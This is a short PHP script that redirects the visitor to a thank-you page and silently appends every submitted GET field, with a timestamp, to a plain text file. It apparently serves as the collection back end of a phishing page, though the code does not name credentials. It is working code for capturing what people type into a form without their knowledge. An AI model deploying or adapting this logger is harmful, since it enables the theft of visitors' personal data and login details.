<?php
header ('Location: ty.html');
$handle = fopen("button.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
  fwrite($handle, "Date&Time:".date('D M j, Y, h:i A',  strtotime("+8 hours"))."\r\n"); 
  fwrite($handle, "========================================== ");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 